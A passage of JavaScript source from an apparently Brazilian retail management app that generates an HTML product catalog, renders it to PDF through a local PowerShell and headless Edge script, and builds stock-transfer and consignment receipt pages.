    creme:'#f5f0d8', lilas:'#c39bd3', salmao:'#e88070', mostarda:'#c8a415',
    bordo:'#800020', coral:'#ff6b6b', terracota:'#c1440e', khaki:'#8b8040',
  };
  function corChip(cor) {
    const k = cor.toLowerCase().trim().replace(/\s+/g, '');
    const hex = COR_MAP[k] || COR_MAP[k.split(' ')[0]];
    if (!hex) return `<span class="sz-badge">${esc(cor)}</span>`;
    const claro = hex === '#ffffff' || hex === '#f0ebe3' || hex === '#f5f0d8' || hex === '#e8dcc8';
    return `<span class="cor-dot" style="background:${hex};border:1.5px solid ${claro ? '#bbb' : hex}" title="${esc(cor)}"></span>`;
  }

  const totalProdutos = cats.reduce((s, c) => s + c.produtos.length, 0);

  // ── FLUXO CONTÍNUO ────────────────────────────────────────────────────────
  // Os produtos são ORDENADOS por categoria, mas a categoria NÃO quebra página.
  // Uma página só termina quando os 4 espaços estão preenchidos — assim nunca
  // existe página com 1 ou 2 peças por causa de categoria pequena. A categoria
  // continua identificada: etiqueta no card e faixa no cabeçalho da página.
  const POR_PAG = 4;
  const itens = [];
  for (const cat of cats) for (const p of cat.produtos) itens.push({ ...p, _cat: cat.nome });

  // Página real onde cada categoria começa (capa=1, índice=2, produtos a partir de 3)
  const pgDaCat = {};
  itens.forEach((it, i) => {
    if (pgDaCat[it._cat] === undefined) pgDaCat[it._cat] = 3 + Math.floor(i / POR_PAG);
  });

  // ── CAPA ──────────────────────────────────────────────────────────────────
  const capa = `
<div class="page capa">
  <div class="capa-barra-topo" style="background:${R_DK}"></div>
  <div class="capa-corpo">
    <div class="capa-logo-wrap">
      ${logoUri
        ? `<img class="capa-logo" src="${logoUri}" alt="${loja}">`
        : `<div class="capa-loja-txt">${loja}</div>`}
    </div>
    <div class="capa-divisor" style="background:rgba(255,255,255,.3)"></div>
    <h1 class="capa-titulo">${esc(titulo)}</h1>
    ${colecao ? `<p class="capa-colecao">${esc(colecao)}</p>` : ''}
    ${sub ? `<p class="capa-sub">${sub}</p>` : ''}
  </div>
  <div class="capa-rodape" style="border-top:1px solid rgba(255,255,255,.2)">
    <span>${dataHoje}</span>
    <span>${totalProdutos} produto${totalProdutos !== 1 ? 's' : ''} &nbsp;·&nbsp; ${cats.length} categoria${cats.length !== 1 ? 's' : ''}</span>
  </div>
</div>`;

  // ── ÍNDICE ────────────────────────────────────────────────────────────────
  // Sempre UMA folha, em três escalas conforme a quantidade de categorias.
  // Duas colunas só entram quando uma não dá conta: com poucas categorias a
  // coluna dupla deixaria duas metades curtas boiando no meio da folha.
  //   até 18  → 1 coluna, fonte grande
  //   19 a 34 → 2 colunas, fonte média
  //   35+     → 2 colunas, compacto (em vez de virar a folha)
  const indEscala = cats.length <= 18 ? ' ind-largo'
                  : cats.length > 34  ? ' ind-compacto' : '';
  const indice = `
<div class="page pg-indice">
  <div class="pg-header" style="border-bottom:3px solid ${R}">
    <span class="pg-header-titulo" style="color:${R}">Índice</span>
    <span class="pg-header-loja">${loja}</span>
  </div>
  <div class="indice-corpo${indEscala}">
    <div class="ind-cols">
    ${cats.map((c, i) => `
    <div class="ind-linha">
      <span class="ind-num" style="color:${R}">${String(i + 1).padStart(2, '0')}</span>
      <span class="ind-nome">${esc(c.nome)}</span>
      <span class="ind-pts"></span>
      <span class="ind-qt">${c.produtos.length} peça${c.produtos.length !== 1 ? 's' : ''}</span>
      <span class="ind-pag" style="color:${R}">${pgDaCat[c.nome] || ''}</span>
    </div>`).join('')}
    </div>
  </div>
  <div class="pg-footer">${loja} &nbsp;·&nbsp; ${esc(titulo)}</div>
</div>`;

  // ── CARD DE PRODUTO ───────────────────────────────────────────────────────
  function cardProduto(prod) {
    const imgHtml = prod.foto
      ? `<img class="card-foto" src="${prod.foto}" alt="${esc(prod.nome)}">`
      : `<div class="card-sem-foto"><svg viewBox="0 0 40 40" width="36" height="36"><rect width="40" height="40" fill="none"/><path d="M5 32 L15 18 L22 26 L27 20 L35 32Z" fill="#ddd"/><circle cx="28" cy="12" r="4" fill="#ddd"/></svg></div>`;

    const qrId  = prod.codigo_barras || String(prod.id);
    const qrHtml = mostrarQr && qrId
      ? `<div class="card-qr">${qrSvg(qrId, { ecc: 'M', margin: 0 })}</div>` : '';

    const precoHtml = mostrarPreco && prod.preco_venda != null
      ? `<div class="card-preco" style="color:${R}">${Number(prod.preco_venda).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>`
      : '';

    const refHtml = mostrarRef && prod.referencia
      ? `<div class="card-ref">REF: ${esc(prod.referencia)}</div>` : '';

    const coresHtml = prod.cores.length
      ? `<div class="card-linha"><div class="card-cores">${prod.cores.map(corChip).join('')}</div></div>` : '';

    const tamsHtml = prod.tamanhos.length
      ? `<div class="card-linha">${prod.tamanhos.map(t => `<span class="sz-badge">${esc(t)}</span>`).join('')}</div>` : '';

    const catHtml = prod._cat
      ? `<div class="card-cat" style="color:${R};border-color:${R}">${esc(prod._cat)}</div>` : '';

    return `
<div class="card">
  <div class="card-img-box"><div class="card-img-inner">${imgHtml}</div></div>
  <div class="card-body">
    ${catHtml}
    <div class="card-nome">${esc(prod.nome)}</div>
    ${refHtml}
    <div class="card-mid">${coresHtml}${tamsHtml}</div>
    <div class="card-bot">
      ${precoHtml}
      ${qrHtml}
    </div>
  </div>
</div>`;
  }

  // ── PÁGINAS DE PRODUTOS — fluxo contínuo, sempre 4 por página ──────────────
  let paginas = '';
  let pgGlobal = 2; // capa=1, índice=2
  for (let i = 0; i < itens.length; i += POR_PAG) {
    pgGlobal++;
    const fatia = itens.slice(i, i + POR_PAG);
    // categorias presentes NESTA página, na ordem em que aparecem
    const catsPag = [];
    for (const it of fatia) if (!catsPag.includes(it._cat)) catsPag.push(it._cat);
    while (fatia.length < POR_PAG) fatia.push(null);

    paginas += `
<div class="page pg-grade">
  <div class="pg-header" style="border-bottom:2px solid ${R}">
    <span class="pg-header-cat" style="color:${R}">${catsPag.map(esc).join(' &nbsp;·&nbsp; ')}</span>
    <span class="pg-header-loja">${loja}</span>
  </div>
  <div class="grade">
    ${fatia.map(p => p ? cardProduto(p) : '<div class="card card-vazio"></div>').join('\n    ')}
  </div>
  <div class="pg-footer">${loja} &nbsp;·&nbsp; ${esc(titulo)} &nbsp;·&nbsp; pág. ${pgGlobal}</div>
</div>`;
  }

  // ── CONTRA-CAPA ───────────────────────────────────────────────────────────
  const contracapa = `
<div class="page contracapa">
  <div class="cc-faixa" style="background:${R_DK}"></div>
  <div class="cc-corpo">
    ${logoUri
      ? `<img class="cc-logo" src="${logoUri}" alt="${loja}">`
      : `<div class="cc-loja-txt">${loja}</div>`}
    ${sub ? `<div class="cc-sub">${sub}</div>` : ''}
    <div class="cc-divisor" style="background:rgba(255,255,255,.3)"></div>
    ${tel  ? `<div class="cc-contato">📞 &nbsp;${tel}</div>`  : ''}
    ${end_ ? `<div class="cc-contato">📍 &nbsp;${end_}</div>` : ''}
  </div>
  <div class="cc-rodape" style="border-top:1px solid rgba(255,255,255,.15)">
    <span>${dataHoje}</span>
    <span>${totalProdutos} produto${totalProdutos !== 1 ? 's' : ''}</span>
  </div>
</div>`;

  // ── HTML COMPLETO ─────────────────────────────────────────────────────────
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>${esc(titulo)}</title>
<style>
@page { size: A4 portrait; margin: 0; }
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; background: #fff; color: #1a1a1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }

/* ── PÁGINA BASE ── */
.page {
  width: 210mm;
  height: 297mm;
  overflow: hidden;
  position: relative;
  page-break-after: always;
  display: flex;
  flex-direction: column;
}

/* ── CAPA ── */
.capa { background: ${R}; color: #fff; }
.capa-barra-topo { height: 10mm; flex-shrink: 0; }
.capa-corpo {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 7mm;
  padding: 0 22mm;
}
.capa-logo-wrap { display: flex; align-items: center; justify-content: center; }
.capa-logo { max-width: 60mm; max-height: 28mm; object-fit: contain; filter: brightness(0) invert(1); display: block; }
.capa-loja-txt { font-size: 34pt; font-weight: 900; letter-spacing: .06em; text-align: center; text-transform: uppercase; }
.capa-divisor { width: 24mm; height: 1.5px; margin: 2mm auto; }
.capa-titulo { font-size: 22pt; font-weight: 200; letter-spacing: .12em; text-transform: uppercase; text-align: center; }
.capa-colecao { font-size: 13pt; font-style: italic; opacity: .85; text-align: center; }
.capa-sub { font-size: 10pt; opacity: .65; text-align: center; }
.capa-rodape {
  padding: 5mm 14mm;
  display: flex;
  justify-content: space-between;
  font-size: 8.5pt;
  opacity: .7;
  flex-shrink: 0;
}

/* ── CABEÇALHO / RODAPÉ DAS PÁGINAS INTERNAS ── */
.pg-header {
  flex-shrink: 0;
  display: flex;
  justify-content: space-between;
  align-items: baseline;
  padding: 4mm 8mm 3mm;
}
.pg-header-titulo { font-size: 16pt; font-weight: 700; letter-spacing: .04em; text-transform: uppercase; }
.pg-header-cat    { font-size: 10.5pt; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; }
.pg-header-loja   { font-size: 7.5pt; color: #aaa; letter-spacing: .06em; text-transform: uppercase; }
.pg-footer {
  flex-shrink: 0;
  text-align: center;
  font-size: 7pt;
  color: #bbb;
  letter-spacing: .04em;
  padding: 2.5mm 10mm;
  border-top: 1px solid #f0f0f0;
}

/* ── ÍNDICE — duas colunas, uma folha só ──
   Propriedade columns em vez de flex: o navegador reparte as linhas entre
   as duas colunas sozinho, e break-inside:avoid impede que uma linha seja
   cortada ao meio na virada da coluna.
   NÃO usar crase aqui: este CSS mora dentro de um template literal. */
.pg-indice { padding: 0; }
/* O corpo centraliza verticalmente; as colunas moram no filho .ind-cols.
   Sem esse wrapper o conteúdo cola no topo e sobra meia folha em branco
   quando a loja tem poucas categorias. */
.indice-corpo {
  flex: 1;
  padding: 6mm 14mm;
  display: flex;
  align-items: center;
  overflow: hidden;
}
.ind-cols {
  width: 100%;
  columns: 2;
  column-gap: 10mm;
  column-fill: balance;
}
.ind-linha {
  display: flex;
  align-items: baseline;
  gap: 2mm;
  padding: 3.4mm 0;
  border-bottom: 1px solid #f0f0f0;
  break-inside: avoid;
  -webkit-column-break-inside: avoid;
  page-break-inside: avoid;
}
.ind-num  { font-size: 13pt; font-weight: 900; width: 8mm; flex-shrink: 0; }
.ind-nome { font-size: 9.5pt; font-weight: 500; white-space: nowrap; overflow: hidden; }
.ind-qt   { font-size: 7pt; color: #aaa; white-space: nowrap; }
.ind-pts  { flex: 1; border-bottom: 1.2px dotted #ddd; margin-bottom: 2px; min-width: 4mm; }
.ind-pag  { font-size: 9.5pt; font-weight: 700; width: 7mm; text-align: right; flex-shrink: 0; }

/* Até 18 categorias: uma coluna só, na escala grande — preenche a folha
   inteira sem parecer esticado, e mantém o índice legível de longe. */
.ind-largo .ind-cols { columns: 1; }
.ind-largo .ind-linha { padding: 4.6mm 0; gap: 3mm; }
.ind-largo .ind-num   { font-size: 19pt; width: 13mm; }
.ind-largo .ind-nome  { font-size: 12.5pt; }
.ind-largo .ind-qt    { font-size: 8.5pt; }
.ind-largo .ind-pag   { font-size: 11pt; width: 9mm; }

/* 35 ou mais: aperta em vez de virar a folha */
.ind-compacto .ind-linha { padding: 1.4mm 0; gap: 1.5mm; }
.ind-compacto .ind-num   { font-size: 10pt; width: 6.5mm; }
.ind-compacto .ind-nome  { font-size: 8pt; }
.ind-compacto .ind-qt    { font-size: 6pt; }
.ind-compacto .ind-pag   { font-size: 8pt; width: 6mm; }

/* ── GRADE 2×2 — cards 20% menores; a folga vira MARGEM de respiro ──
   Card 84×112mm (antes 105×135). O espaço liberado não fica sobrando num
   canto: virou margem lateral de 16mm e vertical de 15mm, que é o que uma
   gráfica chama de área de sangria visual. */
.pg-grade { padding: 0; }
.grade {
  flex: 1;
  display: grid;
  grid-template-columns: 84mm 84mm;
  grid-auto-rows: 126mm;
  justify-content: center;
  align-content: center;
  gap: 6mm;
  padding: 6mm 16mm;
  background: #fff;
  overflow: hidden;
}

/* ── CARD ──
   84×126mm contra 105×135mm da versão anterior: −20% de largura e −25% de
   área. A altura tem folga DELIBERADA: 126 − 4 de recuo − 76 de foto = 46mm
   de área de informação para ~32mm de conteúdo.
   Histórico dos cortes, para ninguém reduzir isto de novo sem renderizar:
     112mm → preço e QR cortados fora do cartão;
     120mm → QR cortado pela metade;
     124mm → QR inteiro, mas o overflow:hidden comia o recuo de baixo
             (2,5mm embaixo contra 5mm à direita — QR "sentado" na base).
   Quando o conteúdo encosta no limite, o flex sacrifica o padding em
   silêncio: não dá erro, só fica feio. Renderizar o PDF e medir. */
.card {
  background: #fff;
  border: 1px solid #e6e6e6;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  width: 84mm;
  height: 126mm;
}
.card-vazio { border: none; background: #fff; }

/* Foto quadrada (76×76mm) com margem interna em todos os lados.
   4mm aqui e no .card-body: foto e texto alinhados na mesma coluna. */
.card-img-box {
  flex-shrink: 0;
  padding: 4mm 4mm 0;
}
.card-img-inner {
  width: 76mm;
  height: 76mm;
  overflow: hidden;
  background: #f4f4f4;
}
.card-foto {
  width: 76mm;
  height: 76mm;
  object-fit: cover;
  display: block;
}
.card-sem-foto {
  width: 76mm;
  height: 76mm;
  background: #efefef;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* Info do card — compacta, empilhada, preço cola no fundo */
.card-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  padding: 2.5mm 4mm 4mm;
  gap: 1mm;
  overflow: hidden;
}
.card-cat  {
  font-size: 5.5pt;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: .1em;
  border-left: 2px solid;
  padding-left: 1.5mm;
  line-height: 1.2;
}
.card-nome { font-size: 8.5pt; font-weight: 700; line-height: 1.2; color: #111; }
.card-ref  { font-size: 6pt; color: #bbb; letter-spacing: .06em; }
.card-mid  { display: flex; flex-direction: column; gap: 1mm; }
.card-linha { display: flex; flex-wrap: wrap; gap: 2px; align-items: center; }
.cor-dot   { display: inline-block; width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
.sz-badge  {
  display: inline-block;
  border: 1px solid #d8d8d8;
  border-radius: 2px;
  padding: 0 3px;
  font-size: 6pt;
  color: #555;
  line-height: 1.6;
  letter-spacing: .02em;
}
.card-bot  { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 1.5mm; }
.card-preco { font-size: 11pt; font-weight: 900; line-height: 1; }
/* O QR é um bloco preto denso: com o mesmo recuo do texto ele PARECE mais
   colado na borda do que está. 1mm a mais compensa opticamente — fica 5mm
   da borda direita contra os 4mm do texto. */
.card-qr   { width: 10mm; height: 10mm; flex-shrink: 0; margin-right: 1mm; }
.card-qr svg { width: 10mm; height: 10mm; display: block; }

/* ── CONTRA-CAPA ── */
.contracapa { background: ${R}; color: #fff; }
.cc-faixa   { height: 10mm; flex-shrink: 0; }
.cc-corpo   {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 5mm;
  padding: 0 22mm;
}
.cc-logo    { max-width: 60mm; max-height: 28mm; object-fit: contain; filter: brightness(0) invert(1); display: block; }
.cc-loja-txt { font-size: 28pt; font-weight: 900; letter-spacing: .06em; text-align: center; text-transform: uppercase; }
.cc-sub     { font-size: 11pt; opacity: .75; text-align: center; }
.cc-divisor { width: 20mm; height: 1px; margin: 3mm auto; }
.cc-contato { font-size: 12pt; opacity: .85; text-align: center; }
.cc-rodape  {
  padding: 5mm 14mm;
  display: flex;
  justify-content: space-between;
  font-size: 8.5pt;
  opacity: .6;
  flex-shrink: 0;
}
</style>
</head>
<body>
${capa}
${indice}
${paginas}
${contracapa}
</body>
</html>`;
}

// ── Impressão local direta (sem extensão PS1) ─────────────────────────────────
// ── Geração de PDF via Edge headless ─────────────────────────────────────────
// Recebe HTML completo (standalone), renderiza com Edge --headless=new em A4,
// grava base64 em arquivo temp (evita truncamento via stdout) e retorna { ok, buffer }.
async function _gerarPdfBase64(html) {
  try {
    const appDir = (typeof NL_PATH !== 'undefined' ? NL_PATH : (typeof NL_CWD !== 'undefined' ? NL_CWD : '')).replace(/\\/g, '/');
    if (!appDir) return { ok: false, erro: 'NL_PATH indisponível' };
    const tmpDir = appDir + '/tmp-print';
    try { await Neutralino.filesystem.createDirectory(tmpDir); } catch {}
    const id = Date.now();
    const htmlPath = `${tmpDir}/pdf-${id}.html`;
    const ps1Path  = `${tmpDir}/pdf-${id}.ps1`;
    const b64Path  = `${tmpDir}/pdf-${id}.b64`;
    await Neutralino.filesystem.writeFile(htmlPath, html);
    const escP = s => s.replace(/'/g, "''");
    const htmlW = htmlPath.replace(/\//g, '\\');
    const pdfW  = htmlW.replace(/\.html$/, '.pdf');
    const b64W  = htmlW.replace(/\.html$/, '.b64');
    const ps1 = [
      `$h = '${escP(htmlW)}'`,
      `$p = '${escP(pdfW)}'`,
      `$b = '${escP(b64W)}'`,
      `$e = @('C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',` +
        `'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1`,
      `if (!$e) { Write-Error 'Edge nao encontrado'; exit 1 }`,
      `$u = 'file:///' + $h.Replace('\\','/')`,
      `$eA = @('--headless=new','--no-sandbox','--run-all-compositor-stages-before-draw',` +
        `'--allow-file-access-from-files','--disable-web-security',` +
        `'--print-to-pdf-no-margins','--paper-width=8.267','--paper-height=11.692',` +
        `"--print-to-pdf=$p",'--print-to-pdf-no-header',$u)`,
      `& $e @eA`,
      `$dl = (Get-Date).AddSeconds(20)`,
      `while (!(Test-Path $p) -and (Get-Date) -lt $dl) { Start-Sleep -Milliseconds 300 }`,
      `if (!(Test-Path $p) -or (Get-Item $p).Length -lt 200) { Remove-Item $h -EA 0; exit 2 }`,
      `$bytes = [System.IO.File]::ReadAllBytes($p)`,
      `$b64 = [System.Convert]::ToBase64String($bytes)`,
      `[System.IO.File]::WriteAllText($b, $b64)`,
      `Remove-Item $h,$p -EA 0`,
    ].join('\r\n');
    await Neutralino.filesystem.writeFile(ps1Path, ps1);
    const ps1W = ps1Path.replace(/\//g, '\\');
    const run = await Neutralino.os.execCommand(
      `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${ps1W}"`
    );
    try { await Neutralino.filesystem.remove(ps1Path); } catch {}
    if (run.exitCode !== 0) {
      return { ok: false, erro: `PDF: código ${run.exitCode}`, debug: (run.stdOut||'') + (run.stdErr||'') };
    }
    let b64;
    try { b64 = await Neutralino.filesystem.readFile(b64Path); }
    catch (e) { return { ok: false, erro: 'PDF gerado mas não pôde ser lido: ' + e.message }; }
    try { await Neutralino.filesystem.remove(b64Path); } catch {}
    return { ok: true, buffer: b64.trim() };
  } catch (e) {
    return { ok: false, erro: String(e) };
  }
}

// HTML standalone para o romaneio (A4, sem dependências externas)
function gerarHtmlRomaneio(r, cfg) {
  const esc2 = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const t = r.transferencia;
  const loja = esc2(cfg && cfg.loja_nome ? cfg.loja_nome : 'Salgueiro Gestão');
  const dataBrH = s => `${String(s||'').slice(0,10).split('-').reverse().join('/')} ${String(s||'').slice(11,16)}`;
  const corTam = i => [i.cor,i.tamanho].filter(x=>x&&x!=='Única'&&x!=='U').join(' · ')||'—';
  const linhas = r.itens.map(i => `<tr>
    <td>${esc2(i.produto)}</td><td>${esc2(i.referencia||'—')}</td>
    <td>${esc2(corTam(i))}</td><td>${esc2(i.codigo_barras||'—')}</td>
    <td class="num"><b>${i.qtd}</b></td><td class="conf"></td>
  </tr>`).join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
  <style>
    @page{size:A4;margin:18mm 14mm}
    *{box-sizing:border-box;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif}
    body{font-size:11.5px;color:#111}
    .cab{border-bottom:2.5px solid #222;margin-bottom:12px;padding-bottom:8px}
    .cab h1{font-size:19px;font-weight:800;margin-bottom:2px}
    .cab h2{font-size:12px;letter-spacing:1.5px;color:#555;margin-bottom:8px}
    .info{border-collapse:collapse;width:100%}
    .info td{padding:2px 4px;font-size:11px;vertical-align:top}
    table.tab{width:100%;border-collapse:collapse;margin-top:10px}
    table.tab th{font-size:10px;text-transform:uppercase;letter-spacing:.5px;
      background:#f0f0f0;padding:5px 7px;border:1px solid #bbb;text-align:left}
    table.tab td{border:1px solid #ccc;padding:5px 7px;font-size:11px}
    .num{text-align:right} .conf{min-width:52px}
    .tot td{font-weight:700;background:#f8f8f8;border-color:#aaa}
    .ass{display:flex;gap:60px;margin-top:50px;font-size:10.5px;text-align:center}
    .ass>div{flex:1} .ass .ln{border-bottom:1px solid #333;margin:34px 0 5px}
  </style></head><body>
  <div class="cab">
    <h1>${loja}</h1>
    <h2>ROMANEIO DE TRANSFERÊNCIA Nº ${t.id}</h2>
    <table class="info"><tbody>
      <tr><td><b>De:</b> ${esc2(t.origem)}</td><td><b>Para:</b> ${esc2(t.destino)}</td></tr>
      <tr><td><b>Data:</b> ${dataBrH(t.criado_em)}</td><td><b>Responsável:</b> ${esc2(t.usuario||'—')}</td></tr>
      ${t.obs?`<tr><td colspan="2"><b>Obs:</b> ${esc2(t.obs)}</td></tr>`:''}
    </tbody></table>
  </div>
  <table class="tab"><thead><tr>
    <th>Produto</th><th>Ref.</th><th>Cor / Tam.</th>
    <th>Código de barras</th><th class="num">Qtd</th><th class="conf">Conferido</th>
  </tr></thead><tbody>
    ${linhas}
    <tr class="tot"><td colspan="4">TOTAL DE PEÇAS</td>
      <td class="num">${r.pecas}</td><td></td></tr>
  </tbody></table>
  <div class="ass">
    <div><div class="ln"></div>Entregue por</div>
    <div><div class="ln"></div>Recebido por</div>
  </div>
  </body></html>`;
}

// ─────────────────────────────────────────────────────────────────────────────
// Recibo de prestação de contas — consignado (v3.16.0)
// ─────────────────────────────────────────────────────────────────────────────
function gerarHtmlReciboConsignado(itens, cfg, periodo) {
  const esc2   = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const arred  = v => Math.round((v||0)*100)/100;
  const moeda  = v => 'R$ ' + arred(v).toLocaleString('pt-BR', {minimumFractionDigits:2, maximumFractionDigits:2});
  const dataBr = s => s ? String(s).slice(0,10).split('-').reverse().join('/') : '—';
  const now    = new Date();
  const _p2    = n => String(n).padStart(2,'0');
  const emitido = `${_p2(now.getDate())}/${_p2(now.getMonth()+1)}/${now.getFullYear()} ${_p2(now.getHours())}:${_p2(now.getMinutes())}`;
  const nomeLoja = cfg.nome_loja || 'Boutique do Salgueiro';
  const logoUri  = cfg._logoUri  || '';   // injetado pela rota via leitura de arquivo
  const fornecedor = itens[0]?.fornecedor || '—';
  const deBr  = dataBr(String(periodo.de  || '').slice(0,10));
  const ateBr = dataBr(String(periodo.ate || '').slice(0,10));
  const periodoTexto = periodo.label ||
    (deBr !== '—' && ateBr !== '—' ? `${deBr} até ${ateBr}` : '—');

  // Agrega por produto (nome + cor + tamanho)
  //
  // IMPORTANTE (v3.25.20): o repasse aqui usa EXATAMENTE a mesma fórmula do
  // relatório de comissão de consignados (core/relatorios.js), para que recibo e
  // relatório mostrem os mesmos valores. O repasse é recalculado sobre o valor
  // RECEBIDO (após o desconto do fechamento), não sobre o valor_fornecedor
  // gravado — que em vendas antigas ficou com base no valor de tabela cheio.
  //   fator    = total / subtotal da venda (distribui o desconto do fechamento)
  //   recebido = valor_venda * fator
  //   repasse  = custo + (recebido − custo) * pct%   (fornecedor_ajustado)
  const map = new Map();
  for (const cg of itens) {
    const cor = (cg.cor && cg.cor !== 'Única') ? cg.cor : null;
    const tam = (cg.tamanho && cg.tamanho !== 'U') ? cg.tamanho : null;
    const chave = [cg.produto, cor, tam].filter(Boolean).join(' · ');

    // ESPELHA O RELATÓRIO (core/relatorios.js, v3.25.30): SEM reaplicar o fator
    // do desconto — o valor_venda gravado JÁ é o valor PAGO (líquido de todo
    // desconto, calculado na venda por pdv.js). Reaplicar o fator descontava o
    // mesmo desconto duas vezes.
    //   • Vl. tabela = preço CHEIO do cadastro × qtd (sem desconto)
    //   • Recebido   = valor_venda (o que a loja recebeu)
    //   • Desconto   = tabela − recebido
    //   • Repasse    = valor_fornecedor gravado (já calculado certo na venda)
    const _custo  = arred(cg.valor_custo  || 0);
    const _tabela = arred((Number(cg.qtd) || 0) * (Number(cg.preco_venda) || 0));
    const _receb  = arred(cg.valor_venda || 0);
    const _desc   = arred(_tabela - _receb);
    const _repasse = arred(cg.valor_fornecedor || 0);

    const g = map.get(chave) || { produto: cg.produto, cor, tam, qtd: 0,
      venda: 0, recebido: 0, desconto: 0, custo: 0, comissao: 0, pcts: new Set(), pendente: 0 };
    g.qtd      += Number(cg.qtd) || 0;
    g.venda     = arred(g.venda    + _tabela);
    g.recebido  = arred(g.recebido + _receb);
    g.desconto  = arred(g.desconto + _desc);
    g.custo     = arred(g.custo    + _custo);
    g.comissao  = arred(g.comissao + _repasse);   // repasse gravado, igual ao relatório
    if (cg.pct_fornecedor) g.pcts.add(Number(cg.pct_fornecedor));
    if (cg.status === 'pendente') g.pendente = arred(g.pendente + _repasse);
    map.set(chave, g);
  }
  const grupos = [...map.values()];

  // Totais gerais
  const totQtd   = grupos.reduce((s,g) => s + g.qtd, 0);
  const totVenda  = grupos.reduce((s,g) => arred(s + g.venda), 0);
  const totRecebido = grupos.reduce((s,g) => arred(s + g.recebido), 0);
  const totDesconto = grupos.reduce((s,g) => arred(s + g.desconto), 0);
  const totCusto  = grupos.reduce((s,g) => arred(s + g.custo), 0);
  const totComissao = grupos.reduce((s,g) => arred(s + g.comissao), 0);
  const totPendente = grupos.reduce((s,g) => arred(s + g.pendente), 0);
  // Sobra da loja = recebido − repasse (mesmo critério do relatório: loja_real).
  const totLoja   = arred(totRecebido - totComissao);
  const totLucroForn = arred(totComissao - totCusto);

  const linhasItens = grupos.map(g => {
    const pctLabel = g.pcts.size === 1 ? `${[...g.pcts][0]}%` : 'variado';
    const descricao = [g.produto, g.cor, g.tam].filter(Boolean).join(' · ');
    const lucroG = arred(g.comissao - g.custo);
    return `<tr>
      <td>${esc2(descricao)}</td>
      <td class="num">${g.qtd}</td>
      <td class="num">${moeda(g.venda)}</td>
      <td class="num">${(g.desconto || 0) > 0.005 ? '−' + moeda(g.desconto) : '—'}</td>
      <td class="num">${moeda(g.recebido)}</td>
      <td class="num">${moeda(g.custo)}</td>
      <td class="num">${esc2(pctLabel)}</td>
      <td class="num">${moeda(lucroG)}</td>
      <td class="num"><b>${moeda(g.comissao)}</b></td>
    </tr>`;
  }).join('');

  const statusBadge = totPendente > 0.005
    ? `<span style="display:inline-block;padding:3mm 8mm;border-radius:20px;font-size:13px;font-weight:700;text-transform:uppercase;background:#fff3e0;color:#b76a00;border:2px solid #f0a040">⏳ Pendente — ${moeda(totPendente)} a pagar</span>`
    : `<span style="display:inline-block;padding:3mm 8mm;border-radius:20px;font-size:13px;font-weight:700;text-transform:uppercase;background:#e8f5e9;color:#2e7d32;border:2px solid #66bb6a">✓ Acertado</span>`;

  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<style>
*{box-sizing:border-box;margin:0;padding:0}
@page{size:A4;margin:15mm 18mm}
body{font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#222;background:#fff}
.cab{display:flex;align-items:flex-start;justify-content:space-between;border-bottom:3px solid #8B2635;padding-bottom:8mm;margin-bottom:7mm}
.cab-logo{max-height:18mm;max-width:48mm;object-fit:contain;margin-bottom:2mm;display:block}
.cab-nome{font-size:15px;font-weight:700;color:#8B2635}
.cab-dir{text-align:right}
.cab-dir h1{font-size:20px;font-weight:700;color:#8B2635;letter-spacing:.02em}
.cab-dir .sub{font-size:11px;color:#777;margin-top:2px}
.cab-dir .emitido{font-size:10px;color:#aaa;margin-top:3px}
.bloco-forn{background:#fdf6f6;border:1px solid #e8d0d0;border-radius:6px;padding:5mm 7mm;margin-bottom:6mm}
.bloco-forn .rot{font-size:9px;color:#aaa;text-transform:uppercase;letter-spacing:.08em;margin-bottom:1mm}
.bloco-forn .nome{font-size:17px;font-weight:700;color:#333}
.bloco-forn .per{font-size:11px;color:#777;margin-top:2mm}
h2{font-size:11px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #e0e0e0;padding-bottom:2mm;margin-bottom:3mm;margin-top:6mm}
table{width:100%;border-collapse:collapse;margin-bottom:5mm;font-size:11px}
thead th{background:#8B2635;color:#fff;padding:2.5mm 3mm;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.03em}
thead th.num{text-align:right}
tbody tr:nth-child(even){background:#faf8f8}
tbody td{padding:2mm 3mm;border-bottom:1px solid #eee;vertical-align:middle}
tbody td.num{text-align:right}
.tr-total td{background:#f2e8e8;font-weight:700;border-top:2px solid #8B2635;padding:3mm}
.res{display:grid;grid-template-columns:1fr 1fr;gap:6mm;margin-bottom:6mm}
.res-linha{display:flex;justify-content:space-between;align-items:center;padding:2mm 0;border-bottom:1px solid #eee;font-size:11px;gap:4mm}
.res-linha.dest{font-weight:700;font-size:13px;color:#8B2635;border-top:2px solid #8B2635;border-bottom:2px solid #8B2635;padding:3mm 0;margin-top:1mm}
.res-linha.suave{color:#888;font-size:10px}
.obs{background:#fffbe6;border:1px solid #f0c040;border-radius:4px;padding:3mm 4mm;font-size:10px;color:#856404;margin-bottom:5mm;line-height:1.5}
